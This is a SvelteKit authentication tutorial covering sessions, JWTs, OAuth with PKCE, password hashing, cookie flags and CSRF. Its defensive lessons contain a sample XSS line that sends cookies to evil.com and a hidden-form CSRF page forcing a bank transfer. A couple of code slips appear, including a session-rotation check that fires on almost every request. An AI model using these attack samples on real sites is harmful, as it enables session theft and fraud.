# Authentication Concepts

Before you write a single line of auth code, you need a mental model for what authentication actually is and how it fits into a web application. Getting this wrong has real consequences — leaked passwords, session hijacking, unauthorized access to user data. This is not a feature you can "get mostly right." Authentication is binary: it is either secure or it is not. A single mishandled cookie flag, a forgotten authorization check, or a weak hashing algorithm can compromise every user account in your system.

This module gives you the foundational concepts so that when you implement auth in SvelteKit, you understand *why* each piece exists. We will go deep on the mechanisms — session vs token tradeoffs, OAuth protocol flow, password hashing internals, cookie security, and CSRF attacks — because understanding the "why" is the only defense against the "I did not know that could happen" bugs that make front-page news.

## Authentication vs Authorization

These two words sound similar but represent fundamentally different questions:

- **Authentication** answers "Who are you?" — verifying a user's identity
- **Authorization** answers "What are you allowed to do?" — determining permissions

You must authenticate first, then authorize. They happen in sequence but are separate concerns. A common architecture mistake is tangling them together. Keep them distinct in your code and your thinking.

```
Authentication:  "This request is from user Alice (verified by session cookie)"
Authorization:   "Alice has the 'editor' role, so she can edit posts but not delete users"
```

In practice, authentication happens once (at login) and is remembered via a session or token. Authorization happens on every request — checking whether the authenticated user has permission to perform the requested action.

A real-world analogy: authentication is showing your ID at the airport. Authorization is whether your boarding pass lets you into the first-class lounge. Having a valid ID does not mean you can go everywhere.

### Why the Distinction Matters in Code

```typescript
// src/routes/admin/users/+page.server.ts
import { error, redirect } from '@sveltejs/kit';
import type { PageServerLoad } from './$types';

export const load: PageServerLoad = async ({ locals }) => {
  // AUTHENTICATION: Is the user logged in?
  if (!locals.user) {
    redirect(303, '/login');
  }

  // AUTHORIZATION: Does this user have admin access?
  if (locals.user.role !== 'admin') {
    error(403, 'You do not have permission to access the admin panel');
  }

  // Both checks passed — load the data
  const users = await db.select().from(usersTable);
  return { users };
};
```

Notice the different responses: an unauthenticated user gets redirected to login (they might be a valid user who is not signed in). An authenticated but unauthorized user gets a 403 (they are signed in but lack permission). These are different situations and should be handled differently.

## Session-Based Authentication: The Deep Dive

Session-based auth is the traditional model and still the most secure default for server-rendered apps like SvelteKit. Here is the complete flow:

```
1. User submits email + password via a form
2. Server finds the user record in the database
3. Server hashes the submitted password and compares it to the stored hash
4. If they match, the server creates a session record (in a database or in-memory store)
5. Server sends a Set-Cookie header with the session ID
6. Browser stores the cookie automatically
7. On every subsequent request, the browser sends the cookie
8. Server reads the cookie, looks up the session, and identifies the user
```

The key architectural insight is that the **server holds the truth**. The session record lives on the server. The cookie is just a reference — an opaque identifier that means nothing on its own. This is why session-based auth is inherently more secure than token-based auth for most web apps: the server can revoke a session instantly by deleting the record.

### Session Creation in Detail

```typescript
// src/routes/login/+page.server.ts
import { fail, redirect } from '@sveltejs/kit';
import { randomBytes } from 'crypto';
import bcrypt from 'bcrypt';
import type { Actions } from './$types';

export const actions: Actions = {
  default: async ({ request, cookies }) => {
    const formData = await request.formData();
    const email = formData.get('email')?.toString().trim().toLowerCase();
    const password = formData.get('password')?.toString();

    if (!email || !password) {
      return fail(400, { email, error: 'Email and password are required' });
    }

    // 1. Find the user
    const user = await db.select().from(usersTable)
      .where(eq(usersTable.email, email))
      .get();

    if (!user) {
      // SECURITY: Do not reveal whether the email exists
      // Use the same error message for "no user" and "wrong password"
      return fail(400, { email, error: 'Invalid email or password' });
    }

    // 2. Verify the password
    const validPassword = await bcrypt.compare(password, user.passwordHash);
    if (!validPassword) {
      // Same error message — do not leak information
      return fail(400, { email, error: 'Invalid email or password' });
    }

    // 3. Create a session
    const sessionId = randomBytes(32).toString('hex'); // 256 bits of entropy
    const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days

    await db.insert(sessionsTable).values({
      id: sessionId,
      userId: user.id,
      expiresAt: expiresAt.toISOString()
    });

    // 4. Set the session cookie
    cookies.set('session', sessionId, {
      path: '/',
      httpOnly: true,
      secure: true,
      sameSite: 'lax',
      maxAge: 30 * 24 * 60 * 60 // 30 days in seconds
    });

    redirect(303, '/dashboard');
  }
};
```

### Why "Invalid email or password" Instead of Specific Errors

This is a deliberate security decision. If your login form says "No account found with this email," an attacker can enumerate which email addresses have accounts. They can then use those emails for targeted phishing, credential stuffing from other breaches, or social engineering. By giving the same error message for both cases, you reveal nothing.

Some developers argue this hurts UX. The counterargument: users who forgot their password should use the "Forgot password" flow, which sends an email only if the account exists (and does not reveal the answer to the requester either).

### Session Validation on Every Request

The session cookie is sent with every request. Your `hooks.server.ts` file validates it before any page or API handler runs:

```typescript
// src/hooks.server.ts
import type { Handle } from '@sveltejs/kit';

export const handle: Handle = async ({ event, resolve }) => {
  const sessionId = event.cookies.get('session');

  if (sessionId) {
    // Look up the session in the database
    const session = await db.select().from(sessionsTable)
      .where(eq(sessionsTable.id, sessionId))
      .get();

    if (session && new Date(session.expiresAt) > new Date()) {
      // Session is valid — attach the user to locals
      const user = await db.select({
        id: usersTable.id,
        email: usersTable.email,
        name: usersTable.name,
        role: usersTable.role
      }).from(usersTable)
        .where(eq(usersTable.id, session.userId))
        .get();

      event.locals.user = user ?? null;
      event.locals.session = session;

      // SESSION ROTATION: Extend the session if it is more than halfway expired
      // This prevents legitimate users from being logged out unexpectedly
      const halfLife = (new Date(session.expiresAt).getTime() - Date.now()) / 2;
      if (halfLife < 15 * 24 * 60 * 60 * 1000) { // less than 15 days remaining
        const newExpiry = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
        await db.update(sessionsTable)
          .set({ expiresAt: newExpiry.toISOString() })
          .where(eq(sessionsTable.id, sessionId));

        event.cookies.set('session', sessionId, {
          path: '/',
          httpOnly: true,
          secure: true,
          sameSite: 'lax',
          maxAge: 30 * 24 * 60 * 60
        });
      }
    } else {
      // Session expired or invalid — clean up the cookie
      event.cookies.delete('session', { path: '/' });
      event.locals.user = null;
      event.locals.session = null;
    }
  } else {
    event.locals.user = null;
    event.locals.session = null;
  }

  return resolve(event);
};
```

Notice the **session rotation** pattern. When a session's remaining lifetime drops below the halfway mark, we extend it. This means active users stay logged in indefinitely (each request refreshes the session), while inactive users' sessions eventually expire. Without this, a user who logs in for a 30-day session on January 1st will be unexpectedly logged out on January 31st even if they use the app every day.

### Session Storage: Where to Keep Sessions

Sessions can be stored in several places, each with tradeoffs:

**Database (recommended for most apps):** Sessions live in a `sessions` table. Pros: survives server restarts, works with multiple servers, easy to query and revoke. Cons: adds a database query to every request (mitigated with caching).

**Redis/Memcached (recommended for high-traffic apps):** Sessions live in an in-memory key-value store. Pros: sub-millisecond lookups, built-in TTL expiration, works with multiple servers. Cons: another service to manage, data loss on Redis restart (unless persistence is configured).

**In-memory (development only):** Sessions live in a JavaScript Map. Pros: zero setup. Cons: lost on every server restart, does not work with multiple servers.

**Signed cookies (stateless sessions):** The session data itself is stored in the cookie, signed with a secret key. Pros: no server-side storage, no database query. Cons: limited to 4KB, cannot revoke individual sessions. SvelteKit's `cookies.set()` with `httpOnly` can be used this way for simple cases.

## Token-Based Authentication (JWT): The Complete Picture

JSON Web Tokens (JWTs) take a different approach: instead of storing session data on the server, the token *itself* contains the user's identity and claims, signed with a secret key.

A JWT has three parts, base64-encoded and separated by dots:

```
Header:    { "alg": "HS256", "typ": "JWT" }
Payload:   { "sub": "user_123", "role": "admin", "exp": 1700000000 }
Signature: HMAC-SHA256(base64(header) + "." + base64(payload), secret)
```

The server creates and signs the token at login. On subsequent requests, the client sends the token (usually in an `Authorization` header), and the server verifies the signature without needing to look anything up in a database.

### How JWT Verification Works

When the server receives a JWT:

1. It splits the token into header, payload, and signature
2. It recomputes the signature using the header, payload, and its secret key
3. It compares the computed signature with the received signature
4. If they match, the payload has not been tampered with

This is why JWTs are called "stateless" — the server does not need to store anything. The token is self-contained proof of identity. But this is also the source of their biggest weakness.

### Session vs JWT: The Complete Comparison

| Aspect | Sessions | JWTs |
|--------|----------|------|
| Storage | Server-side (DB/Redis) | Client-side (cookie/localStorage) |
| Revocation | Delete the session record — instant | Cannot revoke until expiry (without a blocklist) |
| Scalability | Requires shared session store across servers | Stateless — any server can verify |
| Size | Cookie is tiny (just a 64-char hex ID) | Token can be 800+ bytes (contains claims) |
| Security | Harder to misuse | Easy to store insecurely (localStorage = XSS risk) |
| Database load | One query per request | Zero queries per request |
| Information leakage | Cookie contains no user data | Payload is base64-encoded (readable!), not encrypted |
| Horizontal scaling | Requires shared session store or sticky sessions | Works across any number of servers |
| Logout | Delete session = instant logout | Token remains valid until expiry |
| Token refresh | Extend session expiry in database | Requires a separate refresh token flow |

### The Revocation Problem

The inability to revoke JWTs is their fundamental weakness. Consider these scenarios:

- A user's account is compromised. With sessions, you delete all their sessions — instant lockout. With JWTs, the attacker's token remains valid for hours or days.
- An employee is fired. Their session can be revoked immediately. Their JWT cannot.
- A user logs out. With sessions, the session is deleted. With JWTs, the token is still valid — you can delete it from the client, but if the attacker copied it, they can still use it.

The "solution" is a server-side blocklist of revoked tokens. But maintaining a blocklist means the server must check it on every request — which is the same database lookup you were trying to avoid by using JWTs in the first place. You have recreated sessions with extra steps.

### When JWTs Make Sense

JWTs are the right choice in specific architectures:

- **Microservices**: Service A authenticates the user and issues a JWT. Services B, C, and D verify the JWT independently without calling back to Service A. The short expiry (15 minutes) limits the revocation window.
- **Third-party API access**: Your API issues tokens to partner applications. Tokens are self-verifying, reducing load on your auth server.
- **Federated identity**: A JWT from an identity provider (Auth0, Firebase) is verified by multiple independent services.

For a monolithic SvelteKit application where your frontend and backend are the same server, JWTs add complexity without benefit. **Use sessions.**

## OAuth 2.0: "Sign in with Google" — The Protocol in Detail

OAuth lets users authenticate with a third-party provider (Google, GitHub, Discord, etc.) instead of creating a password on your site. The authorization code flow with PKCE (Proof Key for Code Exchange) is the modern, secure standard.

### Step-by-Step Protocol Flow

```
┌──────────┐                ┌──────────┐                ┌──────────┐
│  Browser  │                │ Your App  │                │  Google   │
└────┬─────┘                └────┬─────┘                └────┬─────┘
     │                           │                           │
     │  1. Click "Sign in        │                           │
     │     with Google"          │                           │
     │ ────────────────────────> │                           │
     │                           │                           │
     │  2. Generate PKCE         │                           │
     │     code_verifier +       │                           │
     │     code_challenge        │                           │
     │                           │                           │
     │  3. Redirect to Google    │                           │
     │     with code_challenge   │                           │
     │ <──────────────────────── │                           │
     │                           │                           │
     │  4. User logs in to Google and approves               │
     │ ─────────────────────────────────────────────────────>│
     │                           │                           │
     │  5. Google redirects back │                           │
     │     with authorization    │                           │
     │     code                  │                           │
     │ ────────────────────────> │                           │
     │                           │                           │
     │                           │  6. Exchange code +       │
     │                           │     code_verifier for     │
     │                           │     access token          │
     │                           │ ─────────────────────────>│
     │                           │                           │
     │                           │  7. Receive access token  │
     │                           │ <─────────────────────────│
     │                           │                           │
     │                           │  8. Use access token to   │
     │                           │     fetch user profile    │
     │                           │ ─────────────────────────>│
     │                           │                           │
     │                           │  9. Receive user profile  │
     │                           │ <─────────────────────────│
     │                           │                           │
     │                           │ 10. Create/find local     │
     │                           │     user, create session  │
     │                           │                           │
     │ 11. Set session cookie,   │                           │
     │     redirect to dashboard │                           │
     │ <──────────────────────── │                           │
```

### PKCE: Why It Matters

PKCE (pronounced "pixie") prevents authorization code interception attacks. Without PKCE, if an attacker intercepts the authorization code during the redirect (through malware, a compromised browser extension, or an open redirect vulnerability), they can exchange it for an access token.

PKCE works by creating a secret that only your server knows:

```typescript
// Step 2: Generate PKCE challenge
import crypto from 'crypto';

function generatePKCE() {
  // code_verifier: a random string (43-128 characters)
  const verifier = crypto.randomBytes(32).toString('base64url');

  // code_challenge: SHA-256 hash of the verifier, base64url-encoded
  const challenge = crypto
    .createHash('sha256')
    .update(verifier)
    .digest('base64url');

  return { verifier, challenge };
}

// Step 3: Send code_challenge to Google (public)
// Step 6: Send code_verifier to Google (secret, server-to-server)
// Google hashes the verifier and compares it to the challenge
// An attacker who intercepted the challenge cannot derive the verifier
```

### Implementing OAuth in SvelteKit

```typescript
// src/routes/login/github/+server.ts
import { redirect } from '@sveltejs/kit';
import { GITHUB_CLIENT_ID } from '$env/static/private';
import type { RequestHandler } from './$types';

export const GET: RequestHandler = async ({ cookies }) => {
  // Generate a random state parameter to prevent CSRF
  const state = crypto.randomUUID();
  cookies.set('oauth_state', state, {
    path: '/',
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 600 // 10 minutes
  });

  const params = new URLSearchParams({
    client_id: GITHUB_CLIENT_ID,
    redirect_uri: 'https://yourapp.com/login/github/callback',
    scope: 'read:user user:email',
    state
  });

  redirect(302, `https://github.com/login/oauth/authorize?${params}`);
};
```

```typescript
// src/routes/login/github/callback/+server.ts
import { redirect, error } from '@sveltejs/kit';
import { GITHUB_CLIENT_ID, GITHUB_CLIENT_SECRET } from '$env/static/private';
import type { RequestHandler } from './$types';

export const GET: RequestHandler = async ({ url, cookies }) => {
  const code = url.searchParams.get('code');
  const state = url.searchParams.get('state');
  const storedState = cookies.get('oauth_state');

  // Verify state to prevent CSRF attacks
  if (!code || !state || state !== storedState) {
    error(400, 'Invalid OAuth callback');
  }

  cookies.delete('oauth_state', { path: '/' });

  // Exchange code for access token (server-to-server)
  const tokenResponse = await fetch('https://github.com/login/oauth/access_token', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify({
      client_id: GITHUB_CLIENT_ID,
      client_secret: GITHUB_CLIENT_SECRET,
      code,
      redirect_uri: 'https://yourapp.com/login/github/callback'
    })
  });

  const { access_token } = await tokenResponse.json();

  if (!access_token) {
    error(400, 'Failed to obtain access token');
  }

  // Fetch user profile from GitHub
  const userResponse = await fetch('https://api.github.com/user', {
    headers: { 'Authorization': `Bearer ${access_token}` }
  });

  const githubUser = await userResponse.json();

  // Fetch user's emails (may be private)
  const emailResponse = await fetch('https://api.github.com/user/emails', {
    headers: { 'Authorization': `Bearer ${access_token}` }
  });

  const emails = await emailResponse.json();
  const primaryEmail = emails.find((e: any) => e.primary)?.email;

  // Create or find local user
  let user = await db.select().from(usersTable)
    .where(eq(usersTable.githubId, githubUser.id.toString()))
    .get();

  if (!user) {
    // First-time sign-in: create a new user
    [user] = await db.insert(usersTable).values({
      githubId: githubUser.id.toString(),
      email: primaryEmail,
      name: githubUser.name || githubUser.login,
      avatarUrl: githubUser.avatar_url
    }).returning();
  }

  // Create session (same as password auth — OAuth replaces password verification)
  const sessionId = crypto.randomBytes(32).toString('hex');
  await db.insert(sessionsTable).values({
    id: sessionId,
    userId: user.id,
    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString()
  });

  cookies.set('session', sessionId, {
    path: '/',
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 30 * 24 * 60 * 60
  });

  redirect(303, '/dashboard');
};
```

The critical security detail: the code exchange (step 6) happens **server-to-server**. Your `GITHUB_CLIENT_SECRET` never touches the browser. This is why OAuth callbacks must hit a server endpoint, not a client-side route.

After the OAuth flow completes, you create a normal session for the user. OAuth replaces the "verify password" step — the rest of your auth system (sessions, cookies, authorization) works the same way.

## Password Hashing: The Internals

The most important rule: **never store plain-text passwords**. If your database is compromised — and breaches happen to companies of every size — every user's password is exposed. Since people reuse passwords, a breach on your site can compromise their banking, email, and everything else.

Instead, you store a **hash** — a one-way transformation. You can turn a password into a hash, but you cannot reverse a hash back into a password.

### Why General-Purpose Hashes Are Dangerous

Not all hash functions are equal. General-purpose hash functions like MD5 and SHA-256 are *too fast* — an attacker with a modern GPU can compute billions of hashes per second:

```
MD5:      10 billion hashes/second (GPU)
SHA-256:  5 billion hashes/second (GPU)
bcrypt:   25,000 hashes/second (GPU)
argon2:   1,000 hashes/second (GPU, memory-bound)
```

At 10 billion hashes per second, every possible 8-character alphanumeric password can be tried in under 3 hours. At 25,000 hashes per second with bcrypt, the same search would take 28,000 years. That is the difference between a password hash that is merely stored and one that is actually secure.

### Bcrypt Internals

Bcrypt is the most widely used password hashing algorithm. Understanding its internals helps you configure it correctly:

**The work factor (cost):** Bcrypt's first parameter is the cost factor, an integer that determines how many rounds of hashing are performed. The number of rounds is `2^cost`. At cost 10, that is 1,024 rounds. At cost 12, it is 4,096 rounds — four times more work.

```typescript
import bcrypt from 'bcrypt';

// Cost factor benchmarks (approximate, varies by hardware):
//   8  → ~40ms    (too fast for production)
//  10  → ~100ms   (minimum for production)
//  12  → ~300ms   (recommended for 2025)
//  14  → ~1200ms  (strong but slow)

const password = 'mysecretpassword';
const hash = await bcrypt.hash(password, 12);
// "$2b$12$LJ3m4yP9.F2eQ7pJkl8xDe.6YtG3NjQP0V9UJ7xE8M5B2yN0Xzuq"
//  ^^^  ^^
//  |    |_ cost factor
//  |_ algorithm version (2b = current)
```

**Automatic salting:** A salt is random data mixed into the password before hashing. Without salting, two users with the password "password123" produce identical hashes — an attacker could use precomputed "rainbow tables" to crack them instantly. Bcrypt generates a unique 128-bit salt for each hash and embeds it in the output. You never manage salts manually.

**The output format:** `$2b$12$LJ3m4yP9.F2eQ7pJkl8xDe.6YtG3NjQP0V9UJ7xE8M5B2yN0Xzuq`
- `$2b$` — algorithm version
- `12$` — cost factor
- `LJ3m4yP9.F2eQ7pJkl8xDe` — 22-character salt (128 bits, base64-encoded)
- `.6YtG3NjQP0V9UJ7xE8M5B2yN0Xzuq` — 31-character hash (184 bits, base64-encoded)

Because the salt and cost are embedded in the hash, `bcrypt.compare()` can verify a password against a hash without any additional parameters — it extracts the salt and cost from the hash itself.

### Timing Attacks and Constant-Time Comparison

A subtle vulnerability: if your password comparison returns faster for incorrect passwords than correct ones, an attacker can measure response times to determine which characters are correct. `bcrypt.compare()` uses constant-time comparison internally, so it always takes the same amount of time regardless of how many characters match. Never implement your own password comparison with `===`.

### Argon2: The Modern Alternative

**Argon2** won the Password Hashing Competition in 2015 and is the recommended algorithm for new projects. It is resistant to GPU-based attacks because it requires significant memory in addition to CPU time:

```typescript
import { hash, verify } from '@node-rs/argon2';

// Argon2id: recommended variant (combines Argon2i and Argon2d)
const passwordHash = await hash('mysecretpassword', {
  memoryCost: 65536,    // 64MB of RAM required
  timeCost: 3,          // 3 iterations
  parallelism: 4        // 4 threads
});

const isValid = await verify(passwordHash, 'mysecretpassword');
```

Argon2 requires configuring three parameters: memory cost (how much RAM), time cost (how many iterations), and parallelism (how many threads). The memory requirement is what makes it GPU-resistant — GPUs have many cores but limited per-core memory, making Argon2 expensive to parallelize.

**Use Argon2 if your runtime supports it.** Bcrypt is the safe fallback if Argon2 bindings are not available for your deployment target.

## Cookie Security: Every Flag Explained

Cookies are the transport mechanism for sessions. Setting them correctly is non-negotiable. Each flag prevents a specific, well-documented attack:

```typescript
cookies.set('session', sessionId, {
  path: '/',         // Available on all routes
  httpOnly: true,    // JavaScript cannot read this cookie
  secure: true,      // Only sent over HTTPS
  sameSite: 'lax',   // Protects against CSRF attacks
  maxAge: 60 * 60 * 24 * 7  // Expires in 7 days (seconds)
});
```

### httpOnly: Preventing Session Theft via XSS

The `httpOnly` flag prevents JavaScript from accessing the cookie via `document.cookie`. This is your primary defense against XSS-based session theft:

```typescript
// Without httpOnly, an XSS attack can steal the session:
// <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>

// With httpOnly, document.cookie does not include the session cookie.
// The attacker's script cannot read it.
```

### secure: Preventing Session Theft via Network Sniffing

The `secure` flag ensures the cookie is only sent over HTTPS. Without it, a man-in-the-middle attacker on the same network (coffee shop WiFi, hotel network) could intercept the session cookie over plain HTTP. Always set this in production. In development on `localhost`, browsers allow secure cookies over HTTP for convenience.

### sameSite: Preventing CSRF Attacks

The `sameSite` flag controls when the cookie is sent for cross-site requests:

- `'strict'` — Cookie is never sent on cross-origin requests. Maximum security, but breaks legitimate flows: clicking a link to your site from an email or search result arrives without the session cookie, forcing a re-login.
- `'lax'` (recommended) — Cookie is sent on top-level navigations (clicking links) but not on cross-origin POST requests, image loads, or iframes. This stops the primary CSRF vector (cross-site form submission) while allowing normal link navigation.
- `'none'` — Cookie is always sent, even cross-origin. Requires `secure: true`. Only use this for cookies that need to work in iframes or cross-site API calls (rare).

### path: Scoping Cookie Visibility

The `path` flag determines which routes receive the cookie. Setting `path: '/'` makes it available everywhere. You could set `path: '/admin'` to limit it to admin routes, but this is rarely useful — your session cookie should be available on all routes so your hooks can validate it.

### domain: Sharing Cookies Across Subdomains

By default, cookies are only sent to the exact domain that set them. Setting `domain: '.example.com'` makes the cookie available to all subdomains (`app.example.com`, `api.example.com`). Only use this when you need cross-subdomain sessions.

### maxAge vs expires

`maxAge` sets the cookie lifetime in seconds from now. `expires` sets an absolute expiration date. `maxAge` is simpler and preferred. If neither is set, the cookie is a "session cookie" that is deleted when the browser is closed.

## CSRF Protection: Attack Anatomy and Mitigation

**Cross-Site Request Forgery (CSRF)** is an attack where a malicious site tricks the user's browser into making a request to your app. Since cookies are sent automatically, the request appears authenticated.

### The Attack in Detail

```html
<!-- evil.com -->
<h1>Congratulations! You won a free iPhone!</h1>

<!-- Hidden form that submits to the victim's banking site -->
<iframe style="display: none" name="hidden_frame"></iframe>
<form action="https://bank.example.com/transfer" method="POST" target="hidden_frame">
  <input type="hidden" name="to_account" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

If the user has an active session with `bank.example.com`, their session cookie is sent with this form submission automatically. The bank's server sees a valid session and processes the transfer. The user never sees anything — the form submits into a hidden iframe.

### SvelteKit's Built-in CSRF Protection

SvelteKit protects against CSRF automatically. When a form is submitted (POST, PUT, PATCH, DELETE), SvelteKit checks that the `Origin` header matches your application's origin. If the request comes from a different origin, SvelteKit rejects it with a 403.

Combined with `sameSite: 'lax'` cookies, this provides robust CSRF protection out of the box:

1. `sameSite: 'lax'` prevents the cookie from being sent on cross-origin POST requests (stops the attack at the cookie level)
2. SvelteKit's Origin check rejects cross-origin mutations even if the cookie somehow arrives (defense in depth)

You do **not** need to implement CSRF tokens manually in SvelteKit. This is one of the framework's security advantages over raw Express/Fastify setups.

### When CSRF Protection Is Not Enough

SvelteKit's CSRF protection covers form submissions but not your `+server.ts` API endpoints called via `fetch` from client-side JavaScript. For API endpoints that modify data:

1. Always check authentication (`locals.user`) in the handler
2. Validate that the request contains expected data (attackers cannot easily construct JSON payloads via CSRF)
3. For extra-sensitive operations (deleting accounts, transferring money), require re-authentication or a confirmation step

## Auth Libraries: Lucia vs Auth.js vs Custom

Authentication has an enormous surface area for security mistakes. You need to handle password hashing, session management, cookie security, CSRF protection, rate limiting, account lockout, password reset flows, email verification, OAuth integration, and more. Missing any one of these creates a vulnerability.

### Lucia

Lucia was a purpose-built auth library for SvelteKit (and other frameworks). It provided session management primitives while giving you full control over the implementation. The project has been deprecated as of March 2025, with the author recommending that developers implement auth using the concepts Lucia taught (which are the same concepts in this lesson). The source code and documentation remain available as a reference implementation.

### Auth.js (NextAuth for SvelteKit)

Auth.js is a framework-agnostic authentication library with a SvelteKit adapter. It handles OAuth providers, session management, and database adapters:

```typescript
// src/hooks.server.ts
import { SvelteKitAuth } from '@auth/sveltekit';
import GitHub from '@auth/core/providers/github';
import { GITHUB_ID, GITHUB_SECRET } from '$env/static/private';

export const handle = SvelteKitAuth({
  providers: [
    GitHub({ clientId: GITHUB_ID, clientSecret: GITHUB_SECRET })
  ]
});
```

**Pros:** Quick setup for OAuth providers, many providers supported, active maintenance.

**Cons:** Less control over the session model, magic abstractions that can be hard to debug, heavier dependency.

### Custom Implementation

Building your own auth from the primitives (as shown in this lesson) gives you maximum understanding and control. It is more work but results in code you fully understand:

**Pros:** Complete control, no dependency upgrades breaking your auth flow, deep understanding of security implications.

**Cons:** More code to write and maintain, higher risk of security mistakes if you are not careful.

**Recommendation:** For learning, build it yourself using the patterns in this lesson. For production, use a proven library and augment it with custom authorization logic. If you must roll your own, follow a security checklist and have it reviewed by someone with security expertise.

## The Auth Request Lifecycle in SvelteKit

Understanding how authentication flows through a SvelteKit request is essential for building secure applications:

```
Browser sends request with session cookie
  │
  ├─ hooks.server.ts: handle()
  │    ├─ Read session cookie
  │    ├─ Validate session in database
  │    ├─ Attach user to event.locals
  │    └─ (Optionally) rotate session
  │
  ├─ +layout.server.ts: load()
  │    ├─ Read event.locals.user
  │    └─ Return user data to all child pages
  │
  ├─ +page.server.ts: load()
  │    ├─ Check authentication (redirect if not logged in)
  │    ├─ Check authorization (error 403 if not permitted)
  │    └─ Load page-specific data
  │
  ├─ +page.svelte
  │    ├─ Receive data from load function
  │    └─ Render UI based on user state
  │
  └─ +page.server.ts: actions
       ├─ Check authentication
       ├─ Check authorization
       ├─ Validate input
       └─ Perform mutation
```

```typescript
// src/routes/+layout.server.ts
// Make user data available to ALL pages
import type { LayoutServerLoad } from './$types';

export const load: LayoutServerLoad = async ({ locals }) => {
  return {
    user: locals.user ? {
      id: locals.user.id,
      name: locals.user.name,
      email: locals.user.email,
      role: locals.user.role
    } : null
  };
};
```

```svelte
<!-- src/routes/+layout.svelte -->
<script lang="ts">
  let { data, children } = $props();
</script>

<nav>
  {#if data.user}
    <span>Welcome, {data.user.name}</span>
    <form method="POST" action="/logout">
      <button type="submit">Log out</button>
    </form>
  {:else}
    <a href="/login">Log in</a>
    <a href="/register">Register</a>
  {/if}
</nav>

{@render children()}
```

### Protecting Routes

Create a helper function to require authentication in load functions:

```typescript
// src/lib/server/auth.ts
import { redirect, error } from '@sveltejs/kit';
import type { RequestEvent } from '@sveltejs/kit';

export function requireAuth(event: RequestEvent) {
  if (!event.locals.user) {
    // Save the requested URL so we can redirect back after login
    const redirectTo = event.url.pathname + event.url.search;
    redirect(303, `/login?redirectTo=${encodeURIComponent(redirectTo)}`);
  }
  return event.locals.user;
}

export function requireRole(event: RequestEvent, role: string) {
  const user = requireAuth(event);
  if (user.role !== role) {
    error(403, `This page requires the '${role}' role`);
  }
  return user;
}
```

```typescript
// src/routes/admin/+page.server.ts
import { requireRole } from '$lib/server/auth';
import type { PageServerLoad } from './$types';

export const load: PageServerLoad = async (event) => {
  const user = requireRole(event, 'admin');
  // If we get here, the user is authenticated and has the admin role
  const adminData = await getAdminDashboard();
  return { adminData };
};
```

## What NOT to Do: Security Anti-Patterns

These are common mistakes that create real security vulnerabilities:

- **Storing passwords in plain text or using MD5/SHA-256** — too fast, easily cracked with modern GPUs
- **Storing session tokens in `localStorage`** — vulnerable to XSS. Any script on the page can read localStorage. HttpOnly cookies are invisible to JavaScript.
- **Not setting `httpOnly` on session cookies** — allows XSS attacks to steal session IDs
- **Not using HTTPS in production** — session cookies can be intercepted on the network
- **Implementing "remember me" by storing the password in a cookie** — if the cookie leaks, the password leaks. Use a long-lived session instead.
- **Using predictable session IDs** — sequential numbers, timestamps, or UUIDs v1 (which contain the timestamp and MAC address). Use `crypto.randomBytes(32)` for 256 bits of cryptographic randomness.
- **Not expiring sessions** — a stolen session should not last forever. Set a reasonable expiry (7-30 days) with rotation for active users.
- **Skipping rate limiting on login endpoints** — enables brute-force attacks. After 5-10 failed attempts, slow down responses or temporarily lock the account.
- **Revealing whether an email exists** — "No account found" vs "Wrong password" tells an attacker which emails are registered. Always use "Invalid email or password."
- **Logging passwords** — even accidentally, in error messages, request logs, or debug output. Audit your logging to ensure passwords never appear.
- **Sending password reset tokens in the URL** — URL query parameters are logged by web servers, browser history, and analytics tools. Use a POST form instead.

## Try It

1. **Conceptual**: Write pseudocode for a complete authentication flow: registration (validate input, hash password, store user), login (find user, compare password, create session, set cookie), and a hook that validates the session on every request. Include session rotation for active users.

2. **Analysis**: Draw the OAuth flow for "Sign in with GitHub" — list each HTTP redirect and what data moves between your app, the user's browser, and GitHub's servers. Identify which steps happen in the browser and which happen server-to-server. Explain what the `state` parameter prevents.

3. **Security reasoning**: Explain to a teammate why storing a JWT in `localStorage` is less secure than an `httpOnly` cookie. What attack does each approach protect against or expose? When would you choose JWT over sessions?

4. **Implementation**: Build a complete login/register flow in SvelteKit using form actions. Hash passwords with bcrypt (cost 12). Create sessions in a SQLite database. Set cookies with all security flags. Implement a hook that validates sessions and attaches the user to `event.locals`. Add a logout action that deletes the session. Test that protected pages redirect to login and that the login page redirects back to the originally requested page after successful authentication.

## Key Takeaways

- Authentication verifies identity ("who are you"); authorization controls access ("what can you do") — keep them separate in code
- Session-based auth stores state on the server and is the secure default for SvelteKit apps — the server holds the truth, not the client
- Sessions can be revoked instantly by deleting the server record — this is their primary advantage over JWTs
- JWTs are stateless but cannot be revoked without a blocklist — use them for microservices and third-party APIs, not browser sessions
- OAuth 2.0 with PKCE is the secure standard for third-party authentication — the code exchange happens server-to-server
- Never store plain-text passwords — use bcrypt (cost 12+) or argon2 with automatic salting
- Bcrypt's cost factor is exponential: each increment doubles the time. Argon2 adds memory-hardness for GPU resistance.
- Constant-time comparison prevents timing attacks — never use `===` for password verification
- Set cookies with `httpOnly` (prevents XSS theft), `secure` (prevents network sniffing), and `sameSite: 'lax'` (prevents CSRF) — each flag prevents a specific attack
- SvelteKit handles CSRF protection automatically via Origin header checking on form submissions
- Use session rotation to keep active users logged in while expiring inactive sessions
- Auth is a cross-cutting concern: validate sessions in hooks, pass user data via locals, check authorization in every handler
- Use the same error message for "user not found" and "wrong password" — do not leak account existence
- Use an auth library for production unless you have security expertise — the surface area for mistakes is vast
- The auth lifecycle flows: hooks (validate session) -> layout (share user data) -> page (check authorization) -> action (protect mutations)
